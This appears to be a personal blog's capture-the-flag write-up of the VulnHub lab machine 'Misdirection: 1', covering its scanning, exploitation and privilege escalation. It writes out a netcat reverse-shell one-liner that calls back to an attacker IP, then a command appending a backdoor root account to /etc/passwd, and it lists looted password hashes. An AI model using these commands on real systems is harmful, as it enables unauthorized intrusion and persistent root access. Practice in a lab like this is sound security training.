<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>‡§Æ‡§Ç‡§•‡§® | Manthan</title>
    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
    <link id="codestylesheet" rel="stylesheet" type="text/css" media="screen" href="/static/css/atelier-forest-light.css">
    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
    <script charset="UTF-8" src="/static/js/go.min.js"></script>
   </head>
  <body>
    <div class="body">
      <div class="menu">
        <table>
          <tr>
            <td colspan="3"><a class="menu_home" href="/index.html">‡§Æ‡§Ç‡§•‡§®</a></td>
          </tr>
          <tr>
            <td><a class="menu_archive" href="/archive.html">üíæ Archive</a></td>
            <td><a class="menu_tags" href="/tags.html">üîñ Tags</a></td>
            <td><a class="menu_stats" href="/stats.html">üìä Stats</a></td>
            <!--<td>-->
            <!--  <label class="theme-switch" for="checkbox">-->
            <!--    <input type="checkbox" id="checkbox" />-->
            <!--    <div class="slider round"></div>-->
            <!--  </label>-->
            <!--</td>-->
          </tr>
        </table>
      </div>
      <div class="content">
          <h1 class="h1 title collapsible" onclick="toggle(this);">[VulnHub] Misdirection: 1</h1>
    <div class="title"><code><span class="sparklines"><span style="color:#ffc107;">‚ñÖ</span><span style="color:#f44336;">‚ñÇ</span><span style="color:#4caf50;">‚ñá</span><span style="color:#dc3545;">‚ñÇ</span><span style="color:#dc3545;">‚ñÇ</span><span style="color:#e83e8c;">‚ñà</span><span style="color:#8357ff;">‚ñÑ</span><span style="color:#00bcd4;">‚ñá</span><span style="color:#6610f2;">‚ñÅ</span><span style="color:#17a2b8;">‚ñÅ</span><span style="color:#007bff;">‚ñà</span><span style="color:#f44336;">‚ñÖ</span><span style="color:#20b2aa;">‚ñÖ</span><span style="color:#e83e8c;">‚ñÖ</span><span style="color:#20b2aa;">‚ñÉ</span><span style="color:#e83e8c;">‚ñÅ</span><span style="color:#69359c;">‚ñà</span><span style="color:#20c997;">‚ñÇ</span><span style="color:#5b92e5;">‚ñà</span><span style="color:#00b7eb;">‚ñÜ</span><span style="color:#20b2aa;">‚ñÖ</span><span style="color:#99cc99;">‚ñÅ</span><span style="color:#fd7e14;">‚ñÇ</span><span style="color:#ffcc66;">‚ñá</span><span style="color:#dc3545;">‚ñÉ</span><span style="color:#8357ff;">‚ñÅ</span><span style="color:#6f42c1;">‚ñÑ</span><span style="color:#28a745;">‚ñÇ</span><span style="color:#8357ff;">‚ñÇ</span><span style="color:#20b2aa;">‚ñÑ</span><span style="color:#99cc99;">‚ñÖ</span><span style="color:#6610f2;">‚ñÑ</span><span style="color:#5b92e5;">‚ñÇ</span><span style="color:#fe4164;">‚ñÇ</span><span style="color:#a50b5e;">‚ñà</span><span style="color:#6610f2;">‚ñÖ</span><span style="color:#2196f3;">‚ñÇ</span><span style="color:#6c757d;">‚ñÖ</span><span style="color:#4caf50;">‚ñÇ</span><span style="color:#a50b5e;">‚ñÇ</span><span style="color:#f44336;">‚ñÜ</span><span style="color:#e83e8c;">‚ñÑ</span><span style="color:#fe4164;">‚ñÅ</span><span style="color:#69359c;">‚ñÑ</span><span style="color:#fe4164;">‚ñÜ</span><span style="color:#8357ff;">‚ñÇ</span><span style="color:#8357ff;">‚ñÅ</span><span style="color:#ffc107;">‚ñÅ</span><span style="color:#fe4164;">‚ñÑ</span><span style="color:#5b92e5;">‚ñÅ</span><span style="color:#ffc107;">‚ñà</span><span style="color:#dc3545;">‚ñÖ</span><span style="color:#17a2b8;">‚ñá</span><span style="color:#20c997;">‚ñÜ</span><span style="color:#fd7e14;">‚ñÇ</span><span style="color:#e83e8c;">‚ñÉ</span><span style="color:#e83e8c;">‚ñÑ</span><span style="color:#ffcc66;">‚ñÑ</span><span style="color:#5b92e5;">‚ñÇ</span><span style="color:#ffc107;">‚ñà</span><span style="color:#6f42c1;">‚ñà</span><span style="color:#20c997;">‚ñÉ</span><span style="color:#fd7e14;">‚ñÑ</span><span style="color:#6610f2;">‚ñÇ</span></span></code></div>
    <hr>
          <p style="float:left;"><a href="/posts/20191010_vulnhub-lordoftheroot101.html"> ¬´ </a>üìÖ published on <code>11/Oct/2019</code><a href="/posts/20191017_vulnhub-moria11.html"> ¬ª </a></p>
        <p style="float:right;">üîñ tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
    <div style="clear:both;"></div>
    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/misdirection-1,371/">Misdirection: 1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_misdirection1/machinescli.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
<p class="nested active">Here's the killchain (<code>enumeration</code> ‚Üí <code>exploitation</code> ‚Üí <code>privilege escalation</code>) for this machine:</p>
<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_misdirection1/killchain.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
<p class="nested active">1. <code>8080/tcp/http/Apache httpd 2.4.29 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_php_webshell">exploit_php_webshell</a>, <a href="https://github.com/7h3rAm/writeups#exploit_bash_reverseshell">exploit_bash_reverseshell</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>, <a href="https://github.com/7h3rAm/writeups#privesc_passwd_writable">privesc_passwd_writable</a>  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
<p class="nested active">1. Here's the Nmap scan result:  </p>
<pre class="nested active"><code># Nmap 7.70 scan initiated Fri Oct 11 12:13:32 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.misdirection1/results/192.168.92.187/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.misdirection1/results/192.168.92.187/scans/xml/_quick_tcp_nmap.xml 192.168.92.187
Nmap scan report for 192.168.92.187
Host is up, received arp-response (0.00080s latency).
Scanned at 2019-10-11 12:13:33 PDT for 25s
Not shown: 996 closed ports
Reason: 996 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkS5yl+Dpb7vsMGbzAHXBYrVSUNTh4kYGh8zajM3ZujG0XHLvgkW7xJ6F/meai9IrCB5gTq7+tTsn+fqNk0cAZugz4h+vwm5ekXe5szPPHNxNUlKuNAQ0Rch9k7jT/2pWjtsE5iF6yFlh1UA2vBKqrTWVU5vrGWswdFRMWICKWiFXwl1Tv93STPsKHYoVbq74v2y1mVOLn+3JNMmRNCBFqh8Z2x+1DTep0YY8vIV325iRK5ROKCJAPeyX33uoxQ/cYrdPIS+Whs9QX0C+W343Hf2Ypq93h3/g3NNm54LvZdE6X2vTUcUHGdvK2gU+dWQOiDhCpMDv3wiEAwGlf87P5
|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM+YEivOAqHPDlFWduSuOjAjuJtfC9v/KW2uYB85gxQuibGJQZhFPcxwPEUf7UvQ/a5fr/keKYF2Kdld6gO44jY=
|   256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFHxbfiqinvu3cV7JoKrOF3w64zk+0N0h+/2nu+Z20Mk
80/tcp   open  http    syn-ack ttl 64 Rocket httpd 1.2.6 (Python 2.7.15rc1)
| http-methods:
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)
8080/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:F0:F4:AE (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 11 12:13:58 2019 -- 1 IP address (1 host up) scanned in 26.69 seconds
</code></pre>
<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_misdirection1/openports.png.webp" />  </p>
<p class="nested active">3. We start with <code>8080/tcp</code> service. There are some interesting hits from <code>gobuster</code> scan:  </p>
<pre class="nested active"><code>http://192.168.92.187:8080/debug (Status: 301)
http://192.168.92.187:8080/shell (Status: 301)
http://192.168.92.187:8080/wordpress (Status: 301)
</code></pre>
<p class="nested active">4. Upon checking out the <code>/debug</code> url, we find that it has a PHP web shell called <a href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>. This is a huge convenience as we can now spawn a reverse shell and get fully interactive access:  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_misdirection1/screenshot00.png.webp" />  </p>
<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
<pre class="nested active"><code>22/tcp    |  ssh    |  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    |  http   |  Rocket httpd 1.2.6 (Python 2.7.15rc1)
3306/tcp  |  mysql  |  MySQL (unauthorized)
8080/tcp  |  http   |  Apache httpd 2.4.29 ((Ubuntu))
</code></pre>
<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
<pre class="nested active"><code>http://192.168.92.187:8080/debug
</code></pre>
<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
<pre class="nested active"><code>ssh: root, brexit
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
<p class="nested active">1. We use the web shell to spawn a Bash reverse shell and catch it using a local <code>netcat</code> listener:  </p>
<pre class="nested active"><code>nc -nlvp 443
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.92.183 443 &gt;/tmp/f
</code></pre>
<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_misdirection1/screenshot01.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_misdirection1/screenshot02.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
<pre class="nested active"><code>www-data@misdirection&gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@misdirection&gt;  
www-data@misdirection&gt; uname
Linux misdirection 4.15.0-50-generic #54-Ubuntu SMP Mon May 6 18:46:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
www-data@misdirection&gt;  
www-data@misdirection&gt; ifconfig
ens33:  flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.92.187  netmask 255.255.255.0  broadcast 192.168.92.255
        inet6 fe80::20c:29ff:fef0:f4ae  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:0c:29:f0:f4:ae  txqueuelen 1000  (Ethernet)
        RX packets 847916  bytes 329992802 (329.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 624984  bytes 125640093 (125.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
www-data@misdirection&gt;  
www-data@misdirection&gt; users
root
brexit
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
<p class="nested active">1. We find that the user <code>brexit</code> can run <code>bash</code> with <code>sudo</code> privileges. We also find that the <code>/etc/passwd</code> file has write permissions for group <code>brexit</code>. Combining these two, we need to first switch to user <code>brexit</code> and then modify the <code>/etc/passwd</code> file to add a new entry for a backdoor <code>root</code> user:  </p>
<pre class="nested active"><code>sudo -l
  User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
ls -la /etc/passwd
  -rwxrwxr-- 1 root brexit 1617 Jun  1 01:17 /etc/passwd
sudo -u brexit bash
mkpasswd -m sha-512 password saltsalt
  $6$saltsalt$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/
echo -e &quot;hacker:\$6\$saltsalt\$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9YterLp8wwnSq.qc.eoxqOmSuNp2xS0ktL3nh/:0:0:hacker:/root:/bin/bash&quot; &gt;&gt;/etc/passwd
su hacker
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_misdirection1/screenshot03.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_misdirection1/screenshot04.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.3" src="/static/files/posts_vulnhub_misdirection1/screenshot05.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.4" src="/static/files/posts_vulnhub_misdirection1/screenshot06.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.5" src="/static/files/posts_vulnhub_misdirection1/screenshot07.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.6" src="/static/files/posts_vulnhub_misdirection1/screenshot08.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.1.7" src="/static/files/posts_vulnhub_misdirection1/screenshot09.png.webp" />  </p>
<p class="nested active">2. We can view the file <code>/root/root.txt</code> to get the flag and complete the challenge:  </p>
<pre class="nested active"><code>cat /root/root.txt
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_misdirection1/screenshot10.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
<pre class="nested active"><code>root:$6$PnbVvEMS$OcseJT8lZRrgrW1JBpHJ252SPRxS6Rkh3oVBkrbRBZgHBD1wArL6FcyO5daqaon7waFKwSqbg5fIjFgzU........................
brexit:$6$51s7qYVw$XbTfXEV2acHRp9vmA7VTxO35OLK9EGZJzDGF9nYaukD3eppHsn2P1ESMr.9rRn/YYO70uiUskfkWP0LyR........................
</code></pre>
<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
<pre class="nested active"><code>0d2c6222bfdd3701e0fa12a9a.......
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
<ul class="nested active">
<li><a href="https://www.vulnhub.com/entry/misdirection-1,371/">https://www.vulnhub.com/entry/misdirection-1,371/</a>  </li>
<li><a href="https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf">https://download.vulnhub.com/media/misdirection/Misdirection-Walkthrough.pdf</a>  </li>
</ul>
    <hr>
          <p style="float:left;">¬´ <a href="/posts/20191010_vulnhub-lordoftheroot101.html">[VulnHub] Lord Of The Root: 1....</a> ¬´</p>
      <p style="float:right;">¬ª <a href="/posts/20191017_vulnhub-moria11.html">[VulnHub] Moria: 1.1</a> ¬ª</p>
          </div>
      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">Óäë Óäê Óäó</a></div>
      <script>hljs.initHighlightingOnLoad();</script>
      <script>hljs.initLineNumbersOnLoad();</script>
      <script>
        function toggle(s){
          s.classList.toggle("expanded");
          var t=!1,i=!1,a=!1;
          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
          for(var l=s.nextElementSibling;l;){
            if(t&&l.classList.contains("h2")){
              l.classList.toggle("active");
              break
            }
            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
              l.classList.toggle("active");
              break
            }
            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
              l.classList.toggle("active");
              break
            }
            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
          }
        }
      </script>
    </div>
  </body>
</html>